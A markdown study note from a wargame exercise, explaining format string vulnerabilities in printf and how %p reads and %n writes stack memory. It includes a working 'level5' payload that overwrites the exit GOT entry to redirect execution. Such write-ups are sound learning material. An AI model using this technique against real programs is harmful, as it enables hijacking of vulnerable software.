# Format string

## Concept
When user input is passed as the **first argument** to `printf` (instead of a fixed string), the user controls the **format string** and can read/write the stack and memory.

## Simple definition
- `printf(format, arg1, arg2, ...)`: `format` specifies how to print the arguments.
- If `format` comes from the user (e.g. `printf(buffer)`), the **specifiers** (`%d`, `%p`, `%n`, etc.) are interpreted.
- **%n**: writes the **number of bytes already printed** to the address pointed to by the corresponding argument.

## Where it appears (level5)
In `n()`: `printf(buffer);` — no fixed string, so `buffer` is the format string. We send e.g. `"AAAA%4$p"` to test.

## Useful primitives

| Specifier | Effect |
|-----------|--------|
| %k$p | Print the k-th argument as pointer (stack read) |
| %k$n | Write the number of bytes printed to the address in the k-th argument |
| %nx  | Print an integer in hex in n characters (padding) |

## Why it's useful
- **Read:** find the buffer **index** on the stack (send `AAAA` + `%1$p.%2$p.%3$p.%4$p` → the one that prints `0x41414141` is our buffer).
- **Write:** put the GOT address at the start of the buffer, then `%padding x%k$n` to write the desired value to that address.

## Concrete example (level5)
1. Test payload: `"AAAA" + "%1$p.%2$p.%3$p.%4$p.%5$p"` → output `...0x41414141...` → index **4**.
2. Exploit: buffer = [exit GOT address in 4 bytes] + `"%134513824x%4$n"`.
   - Total bytes printed before `%4$n` = 4 + 134513824 = 0x080484a4 (address of `o`).
   - `%4$n` writes this number to the address read from argument 4 = our buffer = 0x8049838 (GOT exit).

## Diagram (stack at printf time)

```
  esp+0   →  address of our buffer (argument 1 = format)
  esp+4   →  ...
  esp+8   →  ...
  esp+12  →  ...   ← argument 4 = pointer to our buffer (contains GOT exit)
  ...
  %4$n writes to *(arg4) = *0x8049838
```

## Mental summary
Format string = control the first argument of `printf`. %k$p to read, %k$n to write to an address we put in the buffer (index k).

## References
- `printf(3)` (role of `%n`): https://man7.org/linux/man-pages/man3/printf.3.html
